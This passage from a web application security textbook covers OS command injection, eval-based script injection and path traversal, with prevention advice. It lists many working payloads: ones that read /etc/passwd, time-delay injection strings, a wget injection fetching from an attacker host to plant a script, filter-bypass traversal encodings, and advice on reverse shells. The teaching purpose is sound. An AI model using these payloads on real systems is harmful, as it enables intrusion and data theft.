they had been written by the original developer. The fi rst target of an attacker 
at this point typically is to inject an API that runs OS commands.
The PHP function eval is used to dynamically execute code that is passed to 
the function at runtime. Consider a search function that enables users to create 
stored searches that are then dynamically generated as links within their user 
interface. When users access the search function, they use a URL like the following:
/search.php?storedsearch=\$mysearch%3dwahh
The server-side application implements this functionality by dynamically 
generating variables containing the name/value pairs specifi ed in the storedsearch parameter, in this case creating a mysearch variable with the value wahh:
$storedsearch = $_GET[‚Äòstoredsearch‚Äô];
eval(‚Äú$storedsearch;‚Äù);
In this situation, you can submit crafted input that is dynamically executed 
by the eval function, resulting in injection of arbitrary PHP commands into 
the server-side application. The semicolon character can be used to batch commands in a single parameter. For example, to retrieve the contents of the fi le 
/etc/password, you could use either the file_get_contents or system command:
/search.php?storedsearch=\$mysearch%3dwahh;%20echo%20file_get
_contents(‚Äò/etc/passwd‚Äô)
/search.php?storedsearch=\$mysearch%3dwahh;%20system(‚Äòcat%20/etc/
passwd‚Äô)
NOTE The Perl language also contains an eval function that can be 
exploited in the same way. Note that the semicolon character may need to 
be URL-encoded (as %3b) because some CGI script parsers interpret this as a 
parameter delimiter. In classic ASP, Execute() performs a similar role.
c10.indd 362 c10.indd 362 8/19/2011 12:10:46 PM 8/19/2011 12:10:46 PM
Stuttard c10.indd V2 - 07/05/2011 Page 363
 Chapter 10 n Attacking Back-End Components 363
Finding OS Command Injection Flaws
In your application mapping exercises (see Chapter 4), you should have identifi ed any instances where the web application appears to be interacting with 
the underlying operating system by calling external processes or accessing the 
fi lesystem. You should probe all these functions, looking for command injection 
fl aws. In fact, however, the application may issue operating system commands 
containing absolutely any item of user-supplied data, including every URL and 
body parameter and every cookie. To perform a thorough test of the application, 
you therefore need to target all these items within every application function.
Different command interpreters handle shell metacharacters in different ways. 
In principle, any type of application development platform or web server may 
call out to any kind of shell interpreter, running either on its own operating system or that of any other host. Therefore, you should not make any assumptions 
about the application‚Äôs handling of metacharacters based on any knowledge of 
the web server‚Äôs operating system.
Two broad types of metacharacters may be used to inject a separate command 
into an existing preset command:
n The characters ;|& and newline may be used to batch multiple commands, 
one after the other. In some cases, these characters may be doubled with 
different effects. For example, in the Windows command interpreter, 
using && causes the second command to run only if the fi rst is successful. 
Using || causes the second command to always run, regardless of the 
success of the fi rst.
n The backtick character (`) can be used to encapsulate a separate command 
within a data item being processed by the original command. Placing an 
injected command within backticks causes the shell interpreter to execute 
the command and replace the encapsulated text with the results of this 
command before continuing to execute the resulting command string.
In the previous examples, it was straightforward to verify that command injection was possible and to retrieve the results of the injected command, because 
those results were returned immediately within the application‚Äôs response. 
In many cases, however, this may not be possible. You may be injecting into a 
command that returns no results and which does not affect the application‚Äôs 
subsequent processing in any identifi able way. Or the method you have used 
to inject your chosen command may be such that its results are lost as multiple 
commands are batched together.
In general, the most reliable way to detect whether command injection is 
possible is to use time-delay inference in a similar way as was described for 
exploiting blind SQL injection. If a potential vulnerability appears to exist, you 
can then use other methods to confi rm this and to retrieve the results of your 
injected commands.
c10.indd 363 c10.indd 363 8/19/2011 12:10:46 PM 8/19/2011 12:10:46 PM
Stuttard c10.indd V2 - 07/05/2011 Page 364
364 Chapter 10 n Attacking Back-End Components
HACK STEPS
 1. You can normally use the ping command as a means of triggering a time 
delay by causing the server to ping its loopback interface for a specific 
period. There are minor differences between how Windows and UNIXbased platforms handle command separators and the ping command. 
However, the following all-purpose test string should induce a 30-second 
time delay on either platform if no filtering is in place:
|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
To maximize your chances of detecting a command injection flaw if the 
application is filtering certain command separators, you should also submit each of the following test strings to each targeted parameter in turn 
and monitor the time taken for the application to respond:
| ping ‚Äìi 30 127.0.0.1 |
| ping ‚Äìn 30 127.0.0.1 |
& ping ‚Äìi 30 127.0.0.1 &
& ping ‚Äìn 30 127.0.0.1 &
; ping 127.0.0.1 ;
%0a ping ‚Äìi 30 127.0.0.1 %0a
` ping 127.0.0.1 `
 2. If a time delay occurs, the application may be vulnerable to command 
injection. Repeat the test case several times to confirm that the delay was 
not the result of network latency or other anomalies. You can try changing 
the value of the -n or -i parameters and confirming that the delay experienced varies systematically with the value supplied.
 3. Using whichever of the injection strings was found to be successful, try 
injecting a more interesting command (such as ls or dir). Determine 
whether you can retrieve the results of the command to your browser.
 4. If you are unable to retrieve results directly, you have other options:
n You can attempt to open an out-of-band channel back to your computer. 
Try using TFTP to copy tools up to the server, using telnet or netcat to 
create a reverse shell back to your computer, and using the mail command to send command output via SMTP.
n You can redirect the results of your commands to a fi le within the web 
root, which you can then retrieve directly using your browser. For example:
dir > c:\inetpub\wwwroot\foo.txt
 5. When you have found a means of injecting commands and retrieving the 
results, you should determine your privilege level (by using whoami or 
something similar, or attempting to write a harmless file to a protected 
directory). You may then seek to escalate privileges, gain backdoor access 
to sensitive application data, or attack other hosts reachable from the 
compromised server.
c10.indd 364 c10.indd 364 8/19/2011 12:10:46 PM 8/19/2011 12:10:46 PM
Stuttard c10.indd V2 - 07/05/2011 Page 365
 Chapter 10 n Attacking Back-End Components 365
In some cases, it may not be possible to inject an entirely separate command due to fi ltering of required characters or the behavior of the command 
API being used by the application. Nevertheless, it may still be possible to 
interfere with the behavior of the command being performed to achieve 
some desired result.
In one instance seen by the authors, the application passed user input 
to the operating system command nslookup to fi nd the IP address of a 
domain name supplied by the user. The metacharacters needed to inject new 
commands were being blocked, but the < and > characters used to redirect 
the command‚Äôs input and output were allowed. The nslookup command 
usually outputs the IP address for a domain name, which did not seem to 
provide an effective attack vector. However, if an invalid domain name is 
supplied, the command outputs an error message that includes the domain 
name that was looked up. This behavior proved suffi cient to deliver a 
serious attack:
n Submit a fragment of server-executable script code as the domain name 
to be resolved. The script can be encapsulated in quotes to ensure that 
the command interpreter treats it as a single token.
n Use the > character to redirect the command‚Äôs output to a fi le in an executable folder within the web root. The command executed by the operating 
system is as follows:
nslookup ‚Äú[script code]‚Äù > [/path/to/executable_file]
n When the command is run, the following output is redirected to the executable fi le:
** server can‚Äôt find [script code]: NXDOMAIN
n This fi le can then be invoked using a browser, and the injected script 
code is executed on the server. Because most scripting languages allow 
pages to contain a mix of client-side content and server-side markup, 
the parts of the error message that the attacker does not control are 
just treated as plain text, and the markup within the injected script is 
executed. The attack therefore succeeds in leveraging a restricted command injection condition to introduce an unrestricted backdoor into the 
application server.
TRY IT!
http://mdsec.net/admin/18/
c10.indd 365 c10.indd 365 8/19/2011 12:10:47 PM 8/19/2011 12:10:47 PM
Stuttard c10.indd V2 - 07/05/2011 Page 366
366 Chapter 10 n Attacking Back-End Components
HACK STEPS
 1. The < and > characters are used, respectively, to direct the contents of a 
file to the command‚Äôs input and to direct the command‚Äôs output to a file. 
If it is not possible to use the preceding techniques to inject an entirely 
separate command, you may still be able to read and write arbitrary file 
contents using the < and > characters.
 2. Many operating system commands that applications invoke accept a number of command-line parameters that control their behavior. Often, usersupplied input is passed to the command as one of these parameters, and 
you may be able to add further parameters simply by inserting a space 
followed by the relevant parameter. For example, a web-authoring application may contain a function in which the server retrieves a user-specified URL and renders its contents in-browser for editing. If the application 
simply calls out to the wget program, you may be able to write arbitrary 
file contents to the server‚Äôs filesystem by appending the -O command-line 
parameter used by wget. For example:
url=http://wahh-attacker.com/%20-O%20c:\inetpub\wwwroot\scripts\
cmdasp.asp
TIP Many command injection attacks require you to inject spaces to separate command-line arguments. If you fi nd that spaces are being fi ltered by 
the application, and the platform you are attacking is UNIX-based, you may 
be able to use the $IFS environment variable instead, which contains the 
whitespace fi eld separators.
Finding Dynamic Execution Vulnerabilities
Dynamic execution vulnerabilities most commonly arise in languages such 
as PHP and Perl. But in principle, any type of application platform may pass 
user-supplied input to a script-based interpreter, sometimes on a different 
back-end server.
c10.indd 366 c10.indd 366 8/19/2011 12:10:47 PM 8/19/2011 12:10:47 PM
Stuttard c10.indd V2 - 07/05/2011 Page 367
 Chapter 10 n Attacking Back-End Components 367
HACK STEPS
 1. Any item of user-supplied data may be passed to a dynamic execution 
function. Some of the items most commonly used in this way are the 
names and values of cookie parameters and persistent data stored in user 
profiles as the result of previous actions.
 2. Try submitting the following values in turn as each targeted parameter:
;echo%20111111
echo%20111111
response.write%20111111
:response.write%20111111
 3. Review the application‚Äôs responses. If the string 111111 is returned on its 
own (is not preceded by the rest of the command string), the application 
is likely to be vulnerable to the injection of scripting commands.
 4. If the string 111111 is not returned, look for any error messages that indicate that your input is being dynamically executed and that you may need 
to fine-tune your syntax to achieve injection of arbitrary commands.
 5. If the application you are attacking uses PHP, you can use the test string 
phpinfo(), which, if successful, returns the configuration details of the 
PHP environment.
 6. If the application appears to be vulnerable, verify this by injecting some 
commands that result in time delays, as described previously for OS command injection. For example:
system(‚Äòping%20127.0.0.1‚Äô)
Preventing OS Command Injection
In general, the best way to prevent OS command injection fl aws from arising 
is to avoid calling out directly to operating system commands. Virtually any 
conceivable task that a web application may need to carry out can be achieved 
using built-in APIs that cannot be manipulated to perform commands other 
than the one intended.
If it is considered unavoidable to embed user-supplied data into command 
strings that are passed to an operating system command interpreter, the application should enforce rigorous defenses to prevent a vulnerability from arising. 
If possible, a whitelist should be used to restrict user input to a specifi c set of 
expected values. Alternatively, the input should be restricted to a very narrow 
character set, such as alphanumeric characters only. Input containing any other 
data, including any conceivable metacharacter or whitespace, should be rejected.
c10.indd 367 c10.indd 367 8/19/2011 12:10:47 PM 8/19/2011 12:10:47 PM
Stuttard c10.indd V2 - 07/05/2011 Page 368
368 Chapter 10 n Attacking Back-End Components
As a further layer of protection, the application should use command APIs 
that launch a specifi c process via its name and command-line parameters, 
rather than passing a command string to a shell interpreter that supports 
command chaining and redirection. For example, the Java API Runtime.exec
and the ASP.NET API Process.Start do not support shell metacharacters. 
If used properly, they can ensure that only the command intended by the 
developer will be executed. See Chapter 19 for more details of command 
execution APIs.
Preventing Script Injection Vulnerabilities
In general, the best way to avoid script injection vulnerabilities is to not pass 
user-supplied input, or data derived from it, into any dynamic execution or 
include functions. If this is considered unavoidable for some reason, the relevant input should be strictly validated to prevent any attack from occurring. 
If possible, use a whitelist of known good values that the application expects, 
and reject any input that does not appear on this list. Failing that, check the 
characters used within the input against a set known to be harmless, such as 
alphanumeric characters excluding whitespace.
Manipulating File Paths
Many types of functionality commonly found in web applications involve processing user-supplied input as a fi le or directory name. Typically, the input is 
passed to an API that accepts a fi le path, such as in the retrieval of a fi le from the 
local fi lesystem. The application processes the result of the API call within its 
response to the user‚Äôs request. If the user-supplied input is improperly validated, 
this behavior can lead to various security vulnerabilities, the most common of 
which are fi le path traversal bugs and fi le inclusion bugs.
Path Traversal Vulnerabilities
Path traversal vulnerabilities arise when the application uses user-controllable 
data to access fi les and directories on the application server or another backend fi lesystem in an unsafe way. By submitting crafted input, an attacker may 
be able to cause arbitrary content to be read from, or written to, anywhere on 
the fi lesystem being accessed. This often enables an attacker to read sensitive 
information from the server, or overwrite sensitive fi les, ultimately leading to 
arbitrary command execution on the server.
c10.indd 368 c10.indd 368 8/19/2011 12:10:47 PM 8/19/2011 12:10:47 PM
Stuttard c10.indd V2 - 07/05/2011 Page 369
 Chapter 10 n Attacking Back-End Components 369
Consider the following example, in which an application uses a dynamic 
page to return static images to the client. The name of the requested image is 
specifi ed in a query string parameter:
http://mdsec.net/filestore/8/GetFile.ashx?filename=keira.jpg
When the server processes this request, it follows these steps:
 1. Extracts the value of the filename parameter from the query string.
 2. Appends this value to the prefi x C:\filestore\.
 3. Opens the fi le with this name.
 4. Reads the fi le‚Äôs contents and returns it to the client.
The vulnerability arises because an attacker can place path traversal sequences 
into the fi lename to backtrack up from the directory specifi ed in step 2 and 
therefore access fi les from anywhere on the server that the user context used by 
the application has privileges to access. The path traversal sequence is known 
as ‚Äúdot-dot-slash‚Äù; a typical attack looks like this:
http://mdsec.net/filestore/8/GetFile.ashx?filename=..\windows\win.ini
When the application appends the value of the filename parameter to the 
name of the images directory, it obtains the following path:
C:\filestore\..\windows\win.ini
The two traversal sequences effectively step back up from the images directory to the root of the C: drive, so the preceding path is equivalent to this:
C:\windows\win.ini
Hence, instead of returning an image fi le, the server actually returns a default 
Windows confi guration fi le.
NOTE In older versions of Windows IIS web server, applications would, by 
default, run with local system privileges, allowing access to any readable fi le 
on the local fi lesystem. In more recent versions, in common with many other 
web servers, the server‚Äôs process by default runs in a less privileged user 
context. For this reason, when probing for path traversal vulnerabilities, it is 
best to request a default fi le that can be read by any type of user, such as 
c:\windows\win.ini.
In this simple example, the application implements no defenses to prevent 
path traversal attacks. However, because these attacks have been widely known 
c10.indd 369 c10.indd 369 8/19/2011 12:10:47 PM 8/19/2011 12:10:47 PM
Stuttard c10.indd V2 - 07/05/2011 Page 370
370 Chapter 10 n Attacking Back-End Components
about for some time, it is common to encounter applications that implement 
various defenses against them, often based on input validation fi lters. As 
you will see, these fi lters are often poorly designed and can be bypassed by a 
skilled attacker.
TRY IT!
http://mdsec.net/filestore/8/
Finding and Exploiting Path Traversal Vulnerabilities
Many kinds of functionality require a web application to read from or write to 
a fi lesystem on the basis of parameters supplied within user requests. If these 
operations are carried out in an unsafe manner, an attacker can submit crafted 
input that causes the application to access fi les that the application designer 
did not intend it to access. Known as path traversal vulnerabilities, such defects 
may enable the attacker to read sensitive data including passwords and application logs, or to overwrite security-critical items such as confi guration fi les 
and software binaries. In the most serious cases, the vulnerability may enable 
an attacker to completely compromise both the application and the underlying 
operating system.
Path traversal fl aws are sometimes subtle to detect, and many web applications 
implement defenses against them that may be vulnerable to bypasses. We will 
describe all the various techniques you will need, from identifying potential 
targets, to probing for vulnerable behavior, to circumventing the application‚Äôs 
defenses, to dealing with custom encoding.
Locating Targets for Attack
During your initial mapping of the application, you should already have identifi ed 
any obvious areas of attack surface in relation to path traversal vulnerabilities. 
Any functionality whose explicit purpose is uploading or downloading fi les 
should be thoroughly tested. This functionality is often found in work fl ow 
applications where users can share documents, in blogging and auction applications where users can upload images, and in informational applications 
where users can retrieve documents such as ebooks, technical manuals, and 
company reports.
In addition to obvious target functionality of this kind, various other types 
of behavior may suggest relevant interaction with the fi lesystem.
c10.indd 370 c10.indd 370 8/19/2011 12:10:47 PM 8/19/2011 12:10:47 PM
Stuttard c10.indd V2 - 07/05/2011 Page 371
 Chapter 10 n Attacking Back-End Components 371
HACK STEPS
 1. Review the information gathered during application mapping to identify 
the following:
n Any instance where a request parameter appears to contain the name 
of a fi le or directory, such as include=main.inc or template=/en/
sidebar.
n Any application functions whose implementation is likely to involve 
retrieval of data from a server fi lesystem (as opposed to a back-end 
database), such as the displaying of offi ce documents or images.
 2. During all testing you perform in relation to every other kind of vulnerability, look for error messages or other anomalous events that are 
of interest. Try to find any evidence of instances where user-supplied 
data is being passed to file APIs or as parameters to operating system 
commands.
TIP If you have local access to the application (either in a whitebox testing exercise or because you have compromised the server‚Äôs operating system), identifying targets for path traversal testing is usually straightforward, because you can 
monitor all fi lesystem interaction that the application performs.
HACK STEPS
If you have local access to the web application, do the following:
 1. Use a suitable tool to monitor all filesystem activity on the server. For 
example, the FileMon tool from SysInternals can be used on the Windows 
platform, the ltrace/strace tools can be used on Linux, and the truss
command can be used on Sun‚Äôs Solaris.
 2. Test every page of the application by inserting a single unique string (such 
as traversaltest) into each submitted parameter (including all cookies, 
query string fields, and POST data items). Target only one parameter at a 
time, and use the automated techniques described in Chapter 14 to speed 
up the process.
 3. Set a filter in your filesystem monitoring tool to identify all filesystem 
events that contain your test string.
 4. If any events are identified where your test string has been used as or 
incorporated into a file or directory name, test each instance (as described 
next) to determine whether it is vulnerable to path traversal attacks.
c10.indd 371 c10.indd 371 8/19/2011 12:10:47 PM 8/19/2011 12:10:47 PM
Stuttard c10.indd V2 - 07/05/2011 Page 372
372 Chapter 10 n Attacking Back-End Components
Detecting Path Traversal Vulnerabilities
Having identifi ed the various potential targets for path traversal testing, you 
need to test every instance individually to determine whether user-controllable 
data is being passed to relevant fi lesystem operations in an unsafe manner.
For each user-supplied parameter being tested, determine whether traversal 
sequences are being blocked by the application or whether they work as expected. 
An initial test that is usually reliable is to submit traversal sequences in a way 
that does not involve stepping back above the starting directory.
HACK STEPS
 1. Working on the assumption that the parameter you are targeting is being 
appended to a preset directory specified by the application, modify the 
parameter‚Äôs value to insert an arbitrary subdirectory and a single traversal 
sequence. For example, if the application submits this parameter:
file=foo/file1.txt
try submitting this value:
file=foo/bar/../file1.txt
If the application‚Äôs behavior is identical in the two cases, it may be vulnerable. You should proceed directly to attempting to access a different 
file by traversing above the start directory.
 2. If the application‚Äôs behavior is different in the two cases, it may be blocking, stripping, or sanitizing traversal sequences, resulting in an invalid file 
path. You should examine whether there are any ways to circumvent the 
application‚Äôs validation filters (described in the next section).
The reason why this test is effective, even if the subdirectory ‚Äúbar‚Äù does 
not exist, is that most common filesystems perform canonicalization of 
the file path before attempting to retrieve it. The traversal sequence cancels out the invented directory, so the server does not check whether it is 
present.
If you fi nd any instances where submitting traversal sequences without stepping above the starting directory does not affect the application‚Äôs behavior, the 
next test is to attempt to traverse out of the starting directory and access fi les 
from elsewhere on the server fi lesystem.
c10.indd 372 c10.indd 372 8/19/2011 12:10:47 PM 8/19/2011 12:10:47 PM
Stuttard c10.indd V2 - 07/05/2011 Page 373
 Chapter 10 n Attacking Back-End Components 373
HACK STEPS
 1. If the application function you are attacking provides read access to a file, 
attempt to access a known world-readable file on the operating system in 
question. Submit one of the following values as the filename parameter 
you control:
../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../windows/win.ini
If you are lucky, your browser displays the contents of the file you have 
requested, as shown in Figure 10-5.
 2. If the function you are attacking provides write access to a file, it may be 
more difficult to verify conclusively whether the application is vulnerable. One test that is often effective is to attempt to write two files ‚Äî one 
that should be writable by any user, and one that should not be writable 
even by root or Administrator. For example, on Windows platforms you 
can try this:
../../../../../../../../../../../../writetest.txt
../../../../../../../../../../../../windows/system32/config/sam
On UNIX-based platforms, files that root may not write are versiondependent, but attempting to overwrite a directory with a file should 
always fail, so you can try this:
../../../../../../../../../../../../tmp/writetest.txt
../../../../../../../../../../../../tmp
For each pair of tests, if the application‚Äôs behavior is different in 
response to the first and second requests (for example, if the second 
returns an error message but the first does not), the application probably 
is vulnerable.
 3. An alternative method for verifying a traversal flaw with write access is 
to try to write a new file within the web root of the web server and then 
attempt to retrieve this with a browser. However, this method may not 
work if you do not know the location of the web root directory or if the 
user context in which the file access occurs does not have permission to 
write there.
c10.indd 373 c10.indd 373 8/19/2011 12:10:47 PM 8/19/2011 12:10:47 PM
Stuttard c10.indd V2 - 07/05/2011 Page 374
374 Chapter 10 n Attacking Back-End Components
Figure 10-5: A successful path traversal attack
NOTE Virtually all fi lesystems tolerate redundant traversal sequences that 
appear to try to move above the root of the fi lesystem. Hence, it is usually 
advisable to submit a large number of traversal sequences when probing for 
a fl aw, as in the examples given here. It is possible that the starting directory 
to which your data is appended lies deep within the fi lesystem, so using an 
excessive number of sequences helps avoid false negatives.
Also, the Windows platform tolerates both forward slashes and backslashes 
as directory separators, whereas UNIX-based platforms tolerate only the forward slash. Furthermore, some web applications fi lter one version but not 
the other. Even if you are certain that the web server is running a UNIX-based 
operating system, the application may still be calling out to a Windows-based 
back-end component. Because of this, it is always advisable to try both versions when probing for traversal fl aws.
Circumventing Obstacles to Traversal Attacks
If your initial attempts to perform a traversal attack (as just described) are 
unsuccessful, this does not mean that the application is not vulnerable. Many 
application developers are aware of path traversal vulnerabilities and implement 
various kinds of input validation checks in an attempt to prevent them. However, 
those defenses are often fl awed and can be bypassed by a skilled attacker.
The fi rst type of input fi lter commonly encountered involves checking whether 
the fi lename parameter contains any path traversal sequences. If it does, the 
fi lter either rejects the request or attempts to sanitize the input to remove the 
sequences. This type of fi lter is often vulnerable to various attacks that use alternative encodings and other tricks to defeat the fi lter. These attacks all exploit 
the type of canonicalization problems faced by input validation mechanisms, 
as described in Chapter 2.
c10.indd 374 c10.indd 374 8/19/2011 12:10:47 PM 8/19/2011 12:10:47 PM
Stuttard c10.indd V2 - 07/05/2011 Page 375
 Chapter 10 n Attacking Back-End Components 375
HACK STEPS
 1. Always try path traversal sequences using both forward slashes and backslashes. Many input filters check for only one of these, when the filesystem may support both.
 2. Try simple URL-encoded representations of traversal sequences using the 
following encodings. Be sure to encode every single slash and dot within 
your input:
n Dot ‚Äî %2e
n Forward slash ‚Äî %2f
n Backslash ‚Äî %5c
 3. Try using 16-bit Unicode encoding:
n Dot ‚Äî %u002e
n Forward slash ‚Äî %u2215
n Backslash ‚Äî %u2216
 4. Try double URL encoding:
n Dot ‚Äî %252e
n Forward slash ‚Äî %252f
n Backslash ‚Äî %255c
 5. Try overlong UTF-8 Unicode encoding:
n Dot ‚Äî %c0%2e, %e0%40%ae, %c0ae, and so on
n Forward slash ‚Äî %c0%af, %e0%80%af, %c0%2f, and so on
n Backslash ‚Äî %c0%5c, %c0%80%5c, and so on
You can use the illegal Unicode payload type within Burp Intruder to 
generate a huge number of alternate representations of any given character and submit this at the relevant place within your target parameter. 
These representations strictly violate the rules for Unicode representation but nevertheless are accepted by many implementations of Unicode 
decoders, particularly on the Windows platform.
 6. If the application is attempting to sanitize user input by removing traversal sequences and does not apply this filter recursively, it may be 
possible to bypass the filter by placing one sequence within another. For 
example:
....//
....\/
..../\
....\\
c10.indd 375 c10.indd 375 8/19/2011 12:10:48 PM 8/19/2011 12:10:48 PM
Stuttard c10.indd V2 - 07/05/2011 Page 376
376 Chapter 10 n Attacking Back-End Components
TRY IT!
http://mdsec.net/filestore/30/
http://mdsec.net/filestore/39/
http://mdsec.net/filestore/46/
http://mdsec.net/filestore/59/
http://mdsec.net/filestore/65/
The second type of input fi lter commonly encountered in defenses against path 
traversal attacks involves verifying whether the user-supplied fi lename contains 
a suffi x (fi le type) or prefi x (starting directory) that the application expects. This 
type of defense may be used in tandem with the fi lters already described.
HACK STEPS
 1. Some applications check whether the user-supplied filename ends in 
a particular file type or set of file types and reject attempts to access 
anything else. Sometimes this check can be subverted by placing a URLencoded null byte at the end of your requested filename, followed by a 
file type that the application accepts. For example:
../../../../../boot.ini%00.jpg
The reason this attack sometimes succeeds is that the file type check 
is implemented using an API in a managed execution environment in 
which strings are permitted to contain null characters (such as String.
endsWith() in Java). However, when the file is actually retrieved, the 
application ultimately uses an API in an unmanaged environment in which 
strings are null-terminated. Therefore, your filename is effectively truncated to your desired value.
 2. Some applications attempt to control the file type being accessed by 
appending their own file-type suffix to the filename supplied by the user. 
In this situation, either of the preceding exploits may be effective, for the 
same reasons.
 3. Some applications check whether the user-supplied filename starts with 
a particular subdirectory of the start directory, or even a specific filename. 
This check can, of course, be bypassed easily as follows:
filestore/../../../../../../../etc/passwd
 4. If none of the preceding attacks against input filters is successful individually, the application might be implementing multiple types of filters. 
Therefore, you need to combine several of these attacks simultaneously 
(both against traversal sequence filters and file type or directory filters). If
c10.indd 376 c10.indd 376 8/19/2011 12:10:48 PM 8/19/2011 12:10:48 PM
Stuttard c10.indd V2 - 07/05/2011 Page 377
 Chapter 10 n Attacking Back-End Components 377
HACK STEPS
 possible, the best approach here is to try to break the problem into separate stages. For example, if the request for:
diagram1.jpg
is successful, but the request for:
foo/../diagram1.jpg
fails, try all the possible traversal sequence bypasses until a variation on 
the second request is successful. If these successful traversal sequence 
bypasses don‚Äôt enable you to access /etc/passwd, probe whether any 
file type filtering is implemented and can be bypassed by requesting:
diagram1.jpg%00.jpg
Working entirely within the start directory defined by the application, 
try to probe to understand all the filters being implemented, and see 
whether each can be bypassed individually with the techniques described.
 5. Of course, if you have whitebox access to the application, your task is 
much easier, because you can systematically work through different types 
of input and verify conclusively what filename (if any) is actually reaching 
the filesystem.
Coping with Custom Encoding
Probably the craziest path traversal bug that the authors have encountered 
involved a custom encoding scheme for fi lenames that were ultimately handled 
in an unsafe way. It demonstrated how obfuscation is no substitute for security.
The application contained some work fl ow functionality that enabled users 
to upload and download fi les. The request performing the upload supplied a 
fi lename parameter that was vulnerable to a path traversal attack when writing 
the fi le. When a fi le had been successfully uploaded, the application provided 
users with a URL to download it again. There were two important caveats:
n The application verifi ed whether the fi le to be written already existed. If 
it did, the application refused to overwrite it.
n The URLs generated for downloading users‚Äô fi les were represented using 
a proprietary obfuscation scheme. This appeared to be a customized form 
of Base64 encoding in which a different character set was employed at 
each position of the encoded fi lename.
Taken together, these caveats presented a barrier to straightforward exploitation of the vulnerability. First, although it was possible to write arbitrary fi les to 
c10.indd 377 c10.indd 377 8/19/2011 12:10:48 PM 8/19/2011 12:10:48 PM
Stuttard c10.indd V2 - 07/05/2011 Page 378
378 Chapter 10 n Attacking Back-End Components
the server fi lesystem, it was not possible to overwrite any existing fi le. Also, the 
low privileges of the web server process meant that it was not possible to create 
a new fi le in any interesting locations. Second, it was not possible to request 
an arbitrary existing fi le (such as /etc/passwd) without reverse engineering 
the custom encoding, which presented a lengthy and unappealing challenge.
A little experimentation revealed that the obfuscated URLs contained the 
original fi lename string supplied by the user. For example:
n test.txt became zM1YTU4NTY2Y
n foo/../test.txt became E1NzUyMzE0ZjQ0NjMzND
The difference in length of the encoded URLs indicated that no path canonicalization was performed before the encoding was applied. This behavior gave 
us enough of a toehold to exploit the vulnerability. The fi rst step was to submit 
a fi le with the following name:
../../../../../.././etc/passwd/../../tmp/foo
which, in its canonical form, is equivalent to:
/tmp/foo
Therefore, it could be written by the web server. Uploading this fi le produced 
a download URL containing the following obfuscated fi lename:
FhwUk1rNXFUVEJOZW1kNlRsUk5NazE2V1RKTmFrMHdUbXBWZWs1NldYaE5lb
To modify this value to return the fi le /etc/passwd, we simply needed to 
truncate it at the right point, which was:
FhwUk1rNXFUVEJOZW1kNlRsUk5NazE2V1RKTmFrM
Attempting to download a fi le using this value returned the server‚Äôs passwd
fi le as expected. The server had given us suffi cient resources to be able to encode 
arbitrary fi le paths using its scheme, without even deciphering the obfuscation 
algorithm being used!
NOTE You may have noticed the appearance of a redundant ./ in the name 
of our uploaded fi le. This was necessary to ensure that our truncated URL 
ended on a 3-byte boundary of cleartext, and therefore on a 4-byte boundary of encoded text, in line with the Base64 encoding scheme. Truncating an 
encoded URL partway through an encoded block would almost certainly cause 
an error when decoded on the server.
c10.indd 378 c10.indd 378 8/19/2011 12:10:48 PM 8/19/2011 12:10:48 PM
Stuttard c10.indd V2 - 07/05/2011 Page 379
 Chapter 10 n Attacking Back-End Components 379
Exploiting Traversal Vulnerabilities
Having identifi ed a path traversal vulnerability that provides read or write 
access to arbitrary fi les on the server‚Äôs fi lesystem, what kind of attacks can you 
carry out by exploiting these? In most cases, you will fi nd that you have the 
same level of read/write access to the fi lesystem as the web server process does.
HACK STEPS
You can exploit read access path traversal fl aws to retrieve interesting fi les 
from the server that may contain directly useful information or that help you 
refi ne attacks against other vulnerabilities. For example:
n Password fi les for the operating system and application
n Server and application confi guration fi les to discover other vulnerabilities 
or fi ne-tune a different attack
n Include fi les that may contain database credentials
n Data sources used by the application, such as MySQL database fi les or 
XML fi les
n The source code to server-executable pages to perform a code review in 
search of bugs (for example, GetImage.aspx?file=GetImage.aspx)
n Application log fi les that may contain usernames and session tokens and 
the like
If you fi nd a path traversal vulnerability that grants write access, your main 
goal should be to exploit this to achieve arbitrary execution of commands on 
the server. Here are some ways to exploit this vulnerability:
n Create scripts in users‚Äô startup folders.
n Modify fi les such as in.ftpd to execute arbitrary commands when a 
user next connects.
n Write scripts to a web directory with execute permissions, and call them 
from your browser.
Preventing Path Traversal Vulnerabilities
By far the most effective means of eliminating path traversal vulnerabilities is to 
avoid passing user-submitted data to any fi lesystem API. In many cases, including the original example GetFile.ashx?filename=keira.jpg, it is unnecessary 
for an application to do this. Most fi les that are not subject to any access control 
can simply be placed within the web root and accessed via a direct URL. If this 
c10.indd 379 c10.indd 379 8/19/2011 12:10:48 PM 8/19/2011 12:10:48 PM
Stuttard c10.indd V2 - 07/05/2011 Page 380
380 Chapter 10 n Attacking Back-End Components
is not possible, the application can maintain a hard-coded list of image fi les that 
may be served by the page. It can use a different identifi er to specify which 
fi le is required, such as an index number. Any request containing an invalid 
identifi er can be rejected, and there is no attack surface for users to manipulate 
the path of fi les delivered by the page.
In some cases, as with the work fl ow functionality that allows fi le uploading 
and downloading, it may be desirable to allow users to specify fi les by name. 
Developers may decide that the easiest way to implement this is by passing 
the user-supplied fi lename to fi lesystem APIs. In this situation, the application 
should take a defense-in-depth approach to place several obstacles in the way 
of a path traversal attack.
Here are some examples of defenses that may be used; ideally, as many of 
these as possible should be implemented together:
n After performing all relevant decoding and canonicalization of the usersubmitted fi lename, the application should check whether it contains either 
of the path traversal sequences (using backslashes or forward slashes) or 
any null bytes. If so, the application should stop processing the request. It 
should not attempt to perform any sanitization on the malicious fi lename.
n The application should use a hard-coded list of permissible fi le types and 
reject any request for a different type (after the preceding decoding and 
canonicalization have been performed).
n After performing all its fi ltering on the user-supplied fi lename, the application should use suitable fi lesystem APIs to verify that nothing is amiss 
and that the fi le to be accessed using that fi lename is located in the start 
directory specifi ed by the application.
In Java, this can be achieved by instantiating a java.io.File object using 
the user-supplied fi lename and then calling the getCanonicalPath method 
on this object. If the string returned by this method does not begin with the 
name of the start directory, the user has somehow bypassed the application‚Äôs input fi lters, and the request should be rejected.
In ASP.NET, this can be achieved by passing the user-supplied fi lename 
to the System.Io.Path.GetFullPath method and checking the returned 
string in the same way as described for Java.
The application can mitigate the impact of most exploitable path traversal 
vulnerabilities by using a chrooted environment to access the directory containing the fi les to be accessed. In this situation, the chrooted directory is treated as 
c10.indd 380 c10.indd 380 8/19/2011 12:10:48 PM 8/19/2011 12:10:48 PM
Stuttard c10.indd V2 - 07/05/2011 Page 381
 Chapter 10 n Attacking Back-End Components 381
if it is the fi lesystem root, and any redundant traversal sequences that attempt 
to step up above it are ignored. Chrooted fi lesystems are supported natively 
